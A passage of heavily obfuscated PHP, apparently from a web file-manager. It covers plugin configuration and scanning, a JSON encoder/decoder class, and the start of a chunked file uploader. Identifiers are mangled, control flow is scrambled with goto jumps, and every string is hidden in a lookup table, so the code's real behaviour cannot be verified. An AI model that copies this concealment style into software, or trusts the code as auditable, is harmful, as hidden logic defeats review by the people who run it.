$FÚ¤™º¦¼³, $d‘æÆ¼äƒ¦[685] => 0, $d‘æÆ¼äƒ¦[6] => $this->getConfigDefault($CóÏ›¯ù´ë)); $this->insert($CßÜô®ŒŞ); } } public function getConfigDefault($FéŠ”ÈÂ°œ) { $eã¯ÈÍŸŸ =& $_SERVER[Ìó]; $F‚–¼¶¤ï¼ = array(); $cÕÔöãßÇ = $this->getPackageJson($FéŠ”ÈÂ°œ); if (!$cÕÔöãßÇ && is_array($cÕÔöãßÇ[$eã¯ÈÍŸŸ[2168]])) { return $F‚–¼¶¤ï¼; } foreach ($cÕÔöãßÇ[$eã¯ÈÍŸŸ[2168]] as $B’…Àø´ã‡ => $C­åïè¹ùã) { if (!isset($C­åïè¹ùã[$eã¯ÈÍŸŸ[355]]) || isset($F‚–¼¶¤ï¼[$B’…Àø´ã‡])) { continue; } $F‚–¼¶¤ï¼[$B’…Àø´ã‡] = $C­åïè¹ùã[$eã¯ÈÍŸŸ[355]]; } return $F‚–¼¶¤ï¼; } public function getPackageJson($A§ƒÓœ†) { return Hook::apply($A§ƒÓœ† . $_SERVER[Ìó][2169]); } public function getConfig($cİ…®«Ã‹, $E”ö¸ó«» = false) { $CŒ”£‘Öõ =& $_SERVER[Ìó]; $C´ÅßÑİ»ˆ = array(); $cŸÔØ•ÂÚå = $this->loadList($cİ…®«Ã‹); if ($cŸÔØ•ÂÚå && is_array($cŸÔØ•ÂÚå[$CŒ”£‘Öõ[6]])) { $C´ÅßÑİ»ˆ = $cŸÔØ•ÂÚå[$CŒ”£‘Öõ[6]]; } if (!$C´ÅßÑİ»ˆ || $E”ö¸ó«») { $C´ÅßÑİ»ˆ = $this->getConfigDefault($cİ…®«Ã‹); } return $C´ÅßÑİ»ˆ; } public function setConfig($f×ÖÙ…ºÉ˜, $eµå”‹£ = false) { goto Cô„­„±; A¤¾œ•‹Åô: $this->update($Déß³ºéº–[$D¶Ú¨Ÿ‹›º[363]], array($D¶Ú¨Ÿ‹›º[6] => $eÃƒÜŠ”Í)); goto B·½÷äÀ¾ª; b°‹ÎÖëã¾: if ($eµå”‹£ == !1) { $eµå”‹£ = $this->getConfigDefault($f×ÖÙ…ºÉ˜); } $eÃƒÜŠ”Í = $Déß³ºéº–[$D¶Ú¨Ÿ‹›º[6]]; foreach ($eµå”‹£ as $bòø‚ÙØäÌ => $DãÙÁç•Ô») { $eÃƒÜŠ”Í[$bòø‚ÙØäÌ] = is_string($DãÙÁç•Ô») ? trim($DãÙÁç•Ô») : $DãÙÁç•Ô»; } goto A¤¾œ•‹Åô; Cô„­„±: $D¶Ú¨Ÿ‹›º =& $_SERVER[Ìó]; $Déß³ºéº– = $this->loadList($f×ÖÙ…ºÉ˜); if (!$Déß³ºéº–) { return !1; } goto b°‹ÎÖëã¾; B·½÷äÀ¾ª: } public function viewList() { goto C†äâö©†ˆ; C†äâö©†ˆ: $D¦¾§µšÇ =& $_SERVER[Ìó]; $AïÂ¸¨º× = $this->loadList(); $this->pluginScan($AïÂ¸¨º×); goto Fâó˜ë†; AÉš¡ĞÌ: return $aÌïÜä³¸™; goto f¡â“½; Fâó˜ë†: $AïÂ¸¨º× = $this->loadPluginList(); $aÌïÜä³¸™ = array(); foreach ($AïÂ¸¨º× as $dˆ‰´†Ã¨ => $eÅÊ©¨ì…) { unset($eÅÊ©¨ì…[$D¦¾§µšÇ[2161]], $eÅÊ©¨ì…[$D¦¾§µšÇ[6]]); $AŠŞ“àèµ¢ = PLUGIN_DIR . $eÅÊ©¨ì…[$D¦¾§µšÇ[28]] . $D¦¾§µšÇ[2163]; if (!is_file($AŠŞ“àèµ¢)) { continue; } $a¿¥‰ÜİŒ = Hook::apply($eÅÊ©¨ì…[$D¦¾§µšÇ[28]] . $D¦¾§µšÇ[2169]); if (is_array($a¿¥‰ÜİŒ)) { $aÌïÜä³¸™[$dˆ‰´†Ã¨] = array_merge($eÅÊ©¨ì…, $a¿¥‰ÜİŒ); } } goto AÉš¡ĞÌ; f¡â“½: } private function loadPluginList() { $dƒ±Ÿºï–‹ =& $_SERVER[Ìó]; $fåÖŸ·é¯Ù = $this->loadList(); if (strtolower(MOD) == $dƒ±Ÿºï–‹[2170]) { return $fåÖŸ·é¯Ù; } $CŞ‚ˆÅ»¥ = Hook::trigger($dƒ±Ÿºï–‹[2171], $fåÖŸ·é¯Ù); if ($fåÖŸ·é¯Ù && !$CŞ‚ˆÅ»¥) { die; } return $CŞ‚ˆÅ»¥ ? $CŞ‚ˆÅ»¥ : $fåÖŸ·é¯Ù; } private function pluginScan($a«œÚ‰Ê¯) { $bÈöâ³‰ø =& $_SERVER[Ìó]; recursion_dir(PLUGIN_DIR, $B¤Ö ìÏ³‰, $b³­‘µ­ŠÑ, 0); foreach ($B¤Ö ìÏ³‰ as $EŞ¥øñÃŠò) { $CŞ‘¢°ÃÌ = get_path_this($EŞ¥øñÃŠò); if (isset($a«œÚ‰Ê¯[$CŞ‘¢°ÃÌ]) || !file_exists($EŞ¥øñÃŠò . $bÈöâ³‰ø[2172]) || !file_exists($EŞ¥øñÃŠò . $bÈöâ³‰ø[2163])) { continue; } Hook::apply($CŞ‘¢°ÃÌ . $bÈöâ³‰ø[2166]); } } } goto a¾Â¶í”’ó; aä†ëŒÏ¬: class Services_JSON { function __construct($bèèéˆ¿¤‰ = 0) { $this->use = $bèèéˆ¿¤‰; } function utf162utf8($CÏğËãø²) { $aâÚÑÃ©çé =& $_SERVER[Ìó]; if (function_exists($aâÚÑÃ©çé[68])) { return mb_convert_encoding($CÏğËãø², $aâÚÑÃ©çé[1558], $aâÚÑÃ©çé[1907]); } $aòãã½‰ = ord($CÏğËãø²[0]) << 8 | ord($CÏğËãø²[1]); switch (!0) { case (127 & $aòãã½‰) == $aòãã½‰: return chr(127 & $aòãã½‰); case (2047 & $aòãã½‰) == $aòãã½‰: return chr(192 | $aòãã½‰ >> 6 & 31) . chr(128 | $aòãã½‰ & 63); case (65535 & $aòãã½‰) == $aòãã½‰: return chr(224 | $aòãã½‰ >> 12 & 15) . chr(128 | $aòãã½‰ >> 6 & 63) . chr(128 | $aòãã½‰ & 63); } return $aâÚÑÃ©çé[33]; } function utf82utf16($f†÷òçëãô) { $CæŸ†µ‡ñŞ =& $_SERVER[Ìó]; if (function_exists($CæŸ†µ‡ñŞ[68])) { return mb_convert_encoding($f†÷òçëãô, $CæŸ†µ‡ñŞ[1907], $CæŸ†µ‡ñŞ[1558]); } switch (strlen($f†÷òçëãô)) { case 1: return $f†÷òçëãô; case 2: return chr(7 & ord($f†÷òçëãô[0]) >> 2) . chr(192 & ord($f†÷òçëãô[0]) << 6 | 63 & ord($f†÷òçëãô[1])); case 3: return chr(240 & ord($f†÷òçëãô[0]) << 4 | 15 & ord($f†÷òçëãô[1]) >> 2) . chr(192 & ord($f†÷òçëãô[1]) << 6 | 127 & ord($f†÷òçëãô[2])); } return $CæŸ†µ‡ñŞ[33]; } function encode($d¥âÛ¨ÆšŞ) { $bÜí‹ä—£É =& $_SERVER[Ìó]; switch (gettype($d¥âÛ¨ÆšŞ)) { case $bÜí‹ä—£É[1569]: return $d¥âÛ¨ÆšŞ ? $bÜí‹ä—£É[1568] : $bÜí‹ä—£É[1570]; case $bÜí‹ä—£É[1908]: return $bÜí‹ä—£É[99]; case $bÜí‹ä—£É[299]: return (int) $d¥âÛ¨ÆšŞ; case $bÜí‹ä—£É[274]: case $bÜí‹ä—£É[273]: return (double) $d¥âÛ¨ÆšŞ; case $bÜí‹ä—£É[308]: $EÚë¨³‰‡“ = $bÜí‹ä—£É[33]; $cé†ÇæÌù = strlen($d¥âÛ¨ÆšŞ); for ($a°¨´£†Š = 0; $a°¨´£†Š < $cé†ÇæÌù; ++$a°¨´£†Š) { $eä ˜ƒ«ø¾ = ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š]); switch (!0) { case $eä ˜ƒ«ø¾ == 8: $EÚë¨³‰‡“ .= $bÜí‹ä—£É[1909]; break; case $eä ˜ƒ«ø¾ == 9: $EÚë¨³‰‡“ .= $bÜí‹ä—£É[1545]; break; case $eä ˜ƒ«ø¾ == 10: $EÚë¨³‰‡“ .= $bÜí‹ä—£É[1543]; break; case $eä ˜ƒ«ø¾ == 12: $EÚë¨³‰‡“ .= $bÜí‹ä—£É[1910]; break; case $eä ˜ƒ«ø¾ == 13: $EÚë¨³‰‡“ .= $bÜí‹ä—£É[1544]; break; case $eä ˜ƒ«ø¾ == 34: case $eä ˜ƒ«ø¾ == 47: case $eä ˜ƒ«ø¾ == 92: $EÚë¨³‰‡“ .= $bÜí‹ä—£É[93] . $d¥âÛ¨ÆšŞ[$a°¨´£†Š]; break; case $eä ˜ƒ«ø¾ >= 32 && $eä ˜ƒ«ø¾ <= 127: $EÚë¨³‰‡“ .= $d¥âÛ¨ÆšŞ[$a°¨´£†Š]; break; case ($eä ˜ƒ«ø¾ & 224) == 192: $bœ†“Èô’ğ = pack($bÜí‹ä—£É[1911], $eä ˜ƒ«ø¾, ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 1])); $a°¨´£†Š += 1; $AÊÄÜß¦¯• = $this->utf82utf16($bœ†“Èô’ğ); $EÚë¨³‰‡“ .= sprintf($bÜí‹ä—£É[1912], bin2hex($AÊÄÜß¦¯•)); break; case ($eä ˜ƒ«ø¾ & 240) == 224: $bœ†“Èô’ğ = pack($bÜí‹ä—£É[1911], $eä ˜ƒ«ø¾, ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 1]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 2])); $a°¨´£†Š += 2; $AÊÄÜß¦¯• = $this->utf82utf16($bœ†“Èô’ğ); $EÚë¨³‰‡“ .= sprintf($bÜí‹ä—£É[1912], bin2hex($AÊÄÜß¦¯•)); break; case ($eä ˜ƒ«ø¾ & 248) == 240: $bœ†“Èô’ğ = pack($bÜí‹ä—£É[1911], $eä ˜ƒ«ø¾, ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 1]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 2]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 3])); $a°¨´£†Š += 3; $AÊÄÜß¦¯• = $this->utf82utf16($bœ†“Èô’ğ); $EÚë¨³‰‡“ .= sprintf($bÜí‹ä—£É[1912], bin2hex($AÊÄÜß¦¯•)); break; case ($eä ˜ƒ«ø¾ & 252) == 248: $bœ†“Èô’ğ = pack($bÜí‹ä—£É[1911], $eä ˜ƒ«ø¾, ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 1]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 2]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 3]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 4])); $a°¨´£†Š += 4; $AÊÄÜß¦¯• = $this->utf82utf16($bœ†“Èô’ğ); $EÚë¨³‰‡“ .= sprintf($bÜí‹ä—£É[1912], bin2hex($AÊÄÜß¦¯•)); break; case ($eä ˜ƒ«ø¾ & 254) == 252: $bœ†“Èô’ğ = pack($bÜí‹ä—£É[1911], $eä ˜ƒ«ø¾, ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 1]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 2]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 3]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 4]), ord($d¥âÛ¨ÆšŞ[$a°¨´£†Š + 5])); $a°¨´£†Š += 5; $AÊÄÜß¦¯• = $this->utf82utf16($bœ†“Èô’ğ); $EÚë¨³‰‡“ .= sprintf($bÜí‹ä—£É[1912], bin2hex($AÊÄÜß¦¯•)); break; } } return $bÜí‹ä—£É[112] . $EÚë¨³‰‡“ . $bÜí‹ä—£É[112]; case $bÜí‹ä—£É[1913]: if (is_array($d¥âÛ¨ÆšŞ) && count($d¥âÛ¨ÆšŞ) && array_keys($d¥âÛ¨ÆšŞ) !== range(0, sizeof($d¥âÛ¨ÆšŞ) - 1)) { $Fæª»÷Â‰ = array_map(array($this, $bÜí‹ä—£É[1914]), array_keys($d¥âÛ¨ÆšŞ), array_values($d¥âÛ¨ÆšŞ)); foreach ($Fæª»÷Â‰ as $f†„Ğ¬«§) { if (Services_JSON::isError($f†„Ğ¬«§)) { return $f†„Ğ¬«§; } } return $bÜí‹ä—£É[1064] . join($bÜí‹ä—£É[47], $Fæª»÷Â‰) . $bÜí‹ä—£É[311]; } $e­áæ‡ÃÍ = array_map(array($this, $bÜí‹ä—£É[1915]), $d¥âÛ¨ÆšŞ); foreach ($e­áæ‡ÃÍ as $f¾¾ÒíÜôÎ) { if (Services_JSON::isError($f¾¾ÒíÜôÎ)) { return $f¾¾ÒíÜôÎ; } } return $bÜí‹ä—£É[153] . join($bÜí‹ä—£É[47], $e­áæ‡ÃÍ) . $bÜí‹ä—£É[471]; case $bÜí‹ä—£É[1916]: $BÇ¹Ÿ±¡ƒ¿ = get_object_vars($d¥âÛ¨ÆšŞ); $Fæª»÷Â‰ = array_map(array($this, $bÜí‹ä—£É[1914]), array_keys($BÇ¹Ÿ±¡ƒ¿), array_values($BÇ¹Ÿ±¡ƒ¿)); foreach ($Fæª»÷Â‰ as $f†„Ğ¬«§) { if (Services_JSON::isError($f†„Ğ¬«§)) { return $f†„Ğ¬«§; } } return $bÜí‹ä—£É[1064] . join($bÜí‹ä—£É[47], $Fæª»÷Â‰) . $bÜí‹ä—£É[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $bÜí‹ä—£É[99] : new Services_JSON_Error(gettype($d¥âÛ¨ÆšŞ) . $bÜí‹ä—£É[1917]); } } function name_value($fó óêœ¢¸, $bãÏàá†ó¶) { $f³İ·Ş©Ú = $this->encode($bãÏàá†ó¶); if (Services_JSON::isError($f³İ·Ş©Ú)) { return $f³İ·Ş©Ú; } return $this->encode(strval($fó óêœ¢¸)) . $_SERVER[Ìó][4] . $f³İ·Ş©Ú; } function reduce_string($b´—ÙŠ“Š») { $DÊÎŠ†ÍçÈ =& $_SERVER[Ìó]; $b´—ÙŠ“Š» = preg_replace(array($DÊÎŠ†ÍçÈ[1918], $DÊÎŠ†ÍçÈ[1919], $DÊÎŠ†ÍçÈ[1920]), $DÊÎŠ†ÍçÈ[33], $b´—ÙŠ“Š»); return trim($b´—ÙŠ“Š»); } function decode($CŠºçğ½»ª) { $eÁïåŒäÆ” =& $_SERVER[Ìó]; $CŠºçğ½»ª = $this->reduce_string($CŠºçğ½»ª); switch (strtolower($CŠºçğ½»ª)) { case $eÁïåŒäÆ”[1568]: return !0; case $eÁïåŒäÆ”[1570]: return !1; case $eÁïåŒäÆ”[99]: return null; default: $CŒØ•š»ªñ = array(); if (is_numeric($CŠºçğ½»ª)) { return (double) $CŠºçğ½»ª == (int) $CŠºçğ½»ª ? (int) $CŠºçğ½»ª : (double) $CŠºçğ½»ª; } elseif (preg_match($eÁïåŒäÆ”[1921], $CŠºçğ½»ª, $CŒØ•š»ªñ) && $CŒØ•š»ªñ[1] == $CŒØ•š»ªñ[2]) { $dàßùƒ³¿Š = substr($CŠºçğ½»ª, 0, 1); $B—«Óˆèè = substr($CŠºçğ½»ª, 1, -1); $E¥º±™´ò = $eÁïåŒäÆ”[33]; $CÕ ³Ñí = strlen($B—«Óˆèè); for ($B¢±»Â±³ = 0; $B¢±»Â±³ < $CÕ ³Ñí; ++$B¢±»Â±³) { $aª«ÛØÊ“© = substr($B—«Óˆèè, $B¢±»Â±³, 2); $DØçÔˆñİ = ord($B—«Óˆèè[$B¢±»Â±³]); switch (!0) { case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1909]: $E¥º±™´ò .= chr(8); ++$B¢±»Â±³; break; case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1545]: $E¥º±™´ò .= chr(9); ++$B¢±»Â±³; break; case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1543]: $E¥º±™´ò .= chr(10); ++$B¢±»Â±³; break; case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1910]: $E¥º±™´ò .= chr(12); ++$B¢±»Â±³; break; case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1544]: $E¥º±™´ò .= chr(13); ++$B¢±»Â±³; break; case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1329]: case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1922]: case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1538]: case $aª«ÛØÊ“© == $eÁïåŒäÆ”[1540]: if ($dàßùƒ³¿Š == $eÁïåŒäÆ”[112] && $aª«ÛØÊ“© != $eÁïåŒäÆ”[1922] || $dàßùƒ³¿Š == $eÁïåŒäÆ”[55] && $aª«ÛØÊ“© != $eÁïåŒäÆ”[1329]) { $E¥º±™´ò .= $B—«Óˆèè[++$B¢±»Â±³]; } break; case preg_match($eÁïåŒäÆ”[1923], substr($B—«Óˆèè, $B¢±»Â±³, 6)): $b½¢ÉŠ—õÇ = chr(hexdec(substr($B—«Óˆèè, $B¢±»Â±³ + 2, 2))) . chr(hexdec(substr($B—«Óˆèè, $B¢±»Â±³ + 4, 2))); $E¥º±™´ò .= $this->utf162utf8($b½¢ÉŠ—õÇ); $B¢±»Â±³ += 5; break; case $DØçÔˆñİ >= 32 && $DØçÔˆñİ <= 127: $E¥º±™´ò .= $B—«Óˆèè[$B¢±»Â±³]; break; case ($DØçÔˆñİ & 224) == 192: $E¥º±™´ò .= substr($B—«Óˆèè, $B¢±»Â±³, 2); ++$B¢±»Â±³; break; case ($DØçÔˆñİ & 240) == 224: $E¥º±™´ò .= substr($B—«Óˆèè, $B¢±»Â±³, 3); $B¢±»Â±³ += 2; break; case ($DØçÔˆñİ & 248) == 240: $E¥º±™´ò .= substr($B—«Óˆèè, $B¢±»Â±³, 4); $B¢±»Â±³ += 3; break; case ($DØçÔˆñİ & 252) == 248: $E¥º±™´ò .= substr($B—«Óˆèè, $B¢±»Â±³, 5); $B¢±»Â±³ += 4; break; case ($DØçÔˆñİ & 254) == 252: $E¥º±™´ò .= substr($B—«Óˆèè, $B¢±»Â±³, 6); $B¢±»Â±³ += 5; break; } } return $E¥º±™´ò; } elseif (preg_match($eÁïåŒäÆ”[1924], $CŠºçğ½»ª) || preg_match($eÁïåŒäÆ”[1925], $CŠºçğ½»ª)) { goto AëŸÖ¹§¿; aŠÂ´„ö˜˜: $B—«Óˆèè = $this->reduce_string($B—«Óˆèè); if ($B—«Óˆèè == $eÁïåŒäÆ”[33]) { if (reset($F˜¾ß›šå¹) == SERVICES_JSON_IN_ARR) { return $bÈêôÇ³õÖ; } else { return $b£„ñÌöŸ; } } $CÕ ³Ñí = strlen($B—«Óˆèè); goto C¡Âçèç§´; AëŸÖ¹§¿: if ($CŠºçğ½»ª[0] == $eÁïåŒäÆ”[153]) { $F˜¾ß›šå¹ = array(SERVICES_JSON_IN_ARR); $bÈêôÇ³õÖ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $F˜¾ß›šå¹ = array(SERVICES_JSON_IN_OBJ); $b£„ñÌöŸ = array(); } else { $F˜¾ß›šå¹ = array(SERVICES_JSON_IN_OBJ); $b£„ñÌöŸ = new stdClass(); } } array_push($F˜¾ß›šå¹, array($eÁïåŒäÆ”[1926] => SERVICES_JSON_SLICE, $eÁïåŒäÆ”[259] => 0, $eÁïåŒäÆ”[1927] => !1)); $B—«Óˆèè = substr($CŠºçğ½»ª, 1, -1); goto aŠÂ´„ö˜˜; C¡Âçèç§´: for ($B¢±»Â±³ = 0; $B¢±»Â±³ <= $CÕ ³Ñí; ++$B¢±»Â±³) { $EƒÁ‰™ğ‘ = end($F˜¾ß›šå¹); $aª«ÛØÊ“© = substr($B—«Óˆèè, $B¢±»Â±³, 2); if ($B¢±»Â±³ == $CÕ ³Ñí || $B—«Óˆèè[$B¢±»Â±³] == $eÁïåŒäÆ”[47] && $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]] == SERVICES_JSON_SLICE) { $Eàˆã«İÇò = substr($B—«Óˆèè, $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[259]], $B¢±»Â±³ - $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[259]]); array_push($F˜¾ß›šå¹, array($eÁïåŒäÆ”[1926] => SERVICES_JSON_SLICE, $eÁïåŒäÆ”[259] => $B¢±»Â±³ + 1, $eÁïåŒäÆ”[1927] => !1)); if (reset($F˜¾ß›šå¹) == SERVICES_JSON_IN_ARR) { array_push($bÈêôÇ³õÖ, $this->decode($Eàˆã«İÇò)); } elseif (reset($F˜¾ß›šå¹) == SERVICES_JSON_IN_OBJ) { $Fª²ÛğßÃ® = array(); if (preg_match($eÁïåŒäÆ”[1928], $Eàˆã«İÇò, $Fª²ÛğßÃ®)) { $Bá‡££‘âé = $this->decode($Fª²ÛğßÃ®[1]); $eÖ›œ±¹Í = $this->decode($Fª²ÛğßÃ®[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $b£„ñÌöŸ[$Bá‡££‘âé] = $eÖ›œ±¹Í; } else { $b£„ñÌöŸ->{$Bá‡££‘âé} = $eÖ›œ±¹Í; } } elseif (preg_match($eÁïåŒäÆ”[1929], $Eàˆã«İÇò, $Fª²ÛğßÃ®)) { $Bá‡££‘âé = $Fª²ÛğßÃ®[1]; $eÖ›œ±¹Í = $this->decode($Fª²ÛğßÃ®[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $b£„ñÌöŸ[$Bá‡££‘âé] = $eÖ›œ±¹Í; } else { $b£„ñÌöŸ->{$Bá‡££‘âé} = $eÖ›œ±¹Í; } } } } elseif (($B—«Óˆèè[$B¢±»Â±³] == $eÁïåŒäÆ”[112] || $B—«Óˆèè[$B¢±»Â±³] == $eÁïåŒäÆ”[55]) && $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]] != SERVICES_JSON_IN_STR) { array_push($F˜¾ß›šå¹, array($eÁïåŒäÆ”[1926] => SERVICES_JSON_IN_STR, $eÁïåŒäÆ”[259] => $B¢±»Â±³, $eÁïåŒäÆ”[1927] => $B—«Óˆèè[$B¢±»Â±³])); } elseif ($B—«Óˆèè[$B¢±»Â±³] == $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1927]] && $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]] == SERVICES_JSON_IN_STR && (strlen(substr($B—«Óˆèè, 0, $B¢±»Â±³)) - strlen(rtrim(substr($B—«Óˆèè, 0, $B¢±»Â±³), $eÁïåŒäÆ”[93]))) % 2 != 1) { array_pop($F˜¾ß›šå¹); } elseif ($B—«Óˆèè[$B¢±»Â±³] == $eÁïåŒäÆ”[153] && in_array($EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F˜¾ß›šå¹, array($eÁïåŒäÆ”[1926] => SERVICES_JSON_IN_ARR, $eÁïåŒäÆ”[259] => $B¢±»Â±³, $eÁïåŒäÆ”[1927] => !1)); } elseif ($B—«Óˆèè[$B¢±»Â±³] == $eÁïåŒäÆ”[471] && $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]] == SERVICES_JSON_IN_ARR) { array_pop($F˜¾ß›šå¹); } elseif ($B—«Óˆèè[$B¢±»Â±³] == $eÁïåŒäÆ”[1064] && in_array($EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F˜¾ß›šå¹, array($eÁïåŒäÆ”[1926] => SERVICES_JSON_IN_OBJ, $eÁïåŒäÆ”[259] => $B¢±»Â±³, $eÁïåŒäÆ”[1927] => !1)); } elseif ($B—«Óˆèè[$B¢±»Â±³] == $eÁïåŒäÆ”[311] && $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]] == SERVICES_JSON_IN_OBJ) { array_pop($F˜¾ß›šå¹); } elseif ($aª«ÛØÊ“© == $eÁïåŒäÆ”[1930] && in_array($EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F˜¾ß›šå¹, array($eÁïåŒäÆ”[1926] => SERVICES_JSON_IN_CMT, $eÁïåŒäÆ”[259] => $B¢±»Â±³, $eÁïåŒäÆ”[1927] => !1)); $B¢±»Â±³++; } elseif ($aª«ÛØÊ“© == $eÁïåŒäÆ”[1931] && $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[1926]] == SERVICES_JSON_IN_CMT) { array_pop($F˜¾ß›šå¹); $B¢±»Â±³++; for ($bÌ¶§“ø™‹ = $EƒÁ‰™ğ‘[$eÁïåŒäÆ”[259]]; $bÌ¶§“ø™‹ <= $B¢±»Â±³; ++$bÌ¶§“ø™‹) { $B—«Óˆèè = substr_replace($B—«Óˆèè, $eÁïåŒäÆ”[50], $bÌ¶§“ø™‹, 1); } } } if (reset($F˜¾ß›šå¹) == SERVICES_JSON_IN_ARR) { return $bÈêôÇ³õÖ; } elseif (reset($F˜¾ß›šå¹) == SERVICES_JSON_IN_OBJ) { return $b£„ñÌöŸ; } goto fÎ•¬–†–Á; fÎ•¬–†–Á: } } } function isError($CëğÊëˆî¯, $B˜áÉ’ Í¦ = null) { $A“‡© å’Ô =& $_SERVER[Ìó]; if (class_exists($A“‡© å’Ô[1932])) { return PEAR::isError($CëğÊëˆî¯, $B˜áÉ’ Í¦); } elseif (is_object($CëğÊëˆî¯) && (get_class($CëğÊëˆî¯) == $A“‡© å’Ô[1933] || is_subclass_of($CëğÊëˆî¯, $A“‡© å’Ô[1933]))) { return !0; } return !1; } } if (class_exists($_SERVER[Ìó][1934])) { class Services_JSON_Error extends PEAR_Error { function __construct($dõ›«¨ß– = "\x75\x6e\153\156\x6f\x77\x6e\x20\x65\x72\x72\157\x72", $B¢Æ”’ëÒ² = null, $E‚êåáÊİ¢ = null, $E¯È²‰Á£ = null, $Aİ„‘‚ï¯ = null) { parent::PEAR_Error($dõ›«¨ß–, $B¢Æ”’ëÒ², $E‚êåáÊİ¢, $E¯È²‰Á£, $Aİ„‘‚ï¯); } } } else { class Services_JSON_Error { function __construct($AÔÂæóˆÂ = "\165\156\x6b\156\x6f\167\156\x20\145\162\x72\x6f\x72", $D±ÜæèìÕ = null, $Aˆ‰‰¡—¿Ñ = null, $bï†½– = null, $eÚÍ·œ¥¬‹ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto f±ÑÚ¼ƒ¥Ú; a’È‹¾ÕÉ: if (!empty($_FILES)) { $c¡²Â‰À— = $_FILES[$eÔ’Û§óÃé[163]]; $this->uploadFile = $c¡²Â‰À—[$eÔ’Û§óÃé[1935]]; if (!$this->uploadFile && $c¡²Â‰À—[$eÔ’Û§óÃé[1207]] > 0) { show_json($this->errorInfo($c¡²Â‰À—[$eÔ’Û§óÃé[1207]]), !1); } } else { if (isset($in[$eÔ’Û§óÃé[382]])) { $this->uploadFile = isset($in[$eÔ’Û§óÃé[1936]]) ? $eÔ’Û§óÃé[1937] : $eÔ’Û§óÃé[1782]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto cîÚº¥›Ş‚; cîÚº¥›Ş‚: $this->checkSize(); $this->tempPathInit(); goto A†•‘áóà÷; f±ÑÚ¼ƒ¥Ú: $eÔ’Û§óÃé =& $_SERVER[Ìó]; global $in; $this->in =& $in; goto a’È‹¾ÕÉ; A†•‘áóà÷: } public function upload() { goto fÆÛŒŸ—«; fø«ØŒÜ§: CacheLock::lock($this->tempFile, 20); $AÑ†—Âë§³ = $this->statusGet(); $this->initFileTemp(); goto cà›ŒŒ†×; Dİ–ã«ë¸¹: $Aõ´ÕĞ‰ğÈ = $this->writeTo($eÆë±‰êÜÛ, $FĞÌ–“±¡§, $this->tempFile); $eµÆ™á“ó° = IO::hashSimple($eÆë±‰êÜÛ); $Fà«™‹‹šº = IO::size($eÆë±‰êÜÛ); goto C÷‘ëŠÚ»•; FÑ‘…ƒÎ: ignore_timeout(); if (!$this->checkChunkHash($AÑ†—Âë§³)) { $this->showJson($e·†ïŒÅš[1952], !1); } $this->statusSet(!1); goto bÄ”ÓÕŠ ÷; c…†é¨²÷Ô: $a³ô£Êì‘ = $this->tempFile . $e·†ïŒÅš[1940] . $EÆÈàÕÔ¯›; $Fà«™‹‹šº = isset($this->in[$e·†ïŒÅš[515]]) ? intval($this->in[$e·†ïŒÅš[515]]) : 0; $aóÚ¯Œ‚›Ÿ = isset($this->in[$e·†ïŒÅš[1941]]) ? intval($this->in[$e·†ïŒÅš[1941]]) : 0; goto eİ¡—…©õ; fÆÛŒŸ—«: $e·†ïŒÅš =& $_SERVER[Ìó]; $EÆÈàÕÔ¯› = isset($this->in[$e·†ïŒÅš[1938]]) ? intval($this->in[$e·†ïŒÅš[1938]]) : 0; $F²‚¾¬ñ…Ä = isset($this->in[$e·†ïŒÅš[1939]]) ? intval($this->in[$e·†ïŒÅš[1939]]) : 1; goto c…†é¨²÷Ô; FØáŸÛİ‰š: $DãñÀ«¡×¤ = $EÆÈàÕÔ¯› * $aóÚ¯Œ‚›Ÿ; $FĞÌ–“±¡§ = @fopen($this->tempFile, $e·†ïŒÅš[1945]); fseek($FĞÌ–“±¡§, $DãñÀ«¡×¤); goto Dİ–ã«ë¸¹; dÖ¥à…å: $AÑ†—Âë§³[$e·†ïŒÅš[1948]][$e·†ïŒÅš[1949] . $EÆÈàÕÔ¯›] = array($e·†ïŒÅš[1950] => $DãñÀ«¡×¤, $e·†ïŒÅš[1032] => 